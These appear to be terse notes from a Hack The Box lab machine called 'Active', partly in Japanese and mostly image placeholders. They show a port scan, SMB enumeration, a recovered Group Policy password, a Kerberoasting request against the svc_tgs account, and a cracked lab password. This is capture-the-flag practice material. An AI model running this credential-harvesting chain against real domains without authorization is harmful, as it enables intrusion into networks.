![[Active image.png]]

10.10.10.100

rustscan -r 1-65535 -a 10.10.10.100 -- -sV -Pn -A

![[Active image 1.png]]

![[Active image 2.png]]

active.htb

echo "10.10.10.100 active.htb" | tee -a /etc/hosts

SMBの調査

smbclient -L \\active.htb

![[Active image 3.png]]

![[Active image 4.png]]

enum4linux 10.10.10.100

![[Active image 5.png]]

![[Active image 6.png]]

![[Active image 7.png]]

![[Active image 8.png]]

![[Active image 9.png]]

GPPstillStandingStrong2k18

![[Active image 10.png]]

impacket-GetUserSPNs -request -dc-ip active.htb active.htb/svc_tgs

![[Active image 11.png]]

![[Active image 12.png]]

Ticketmaster1968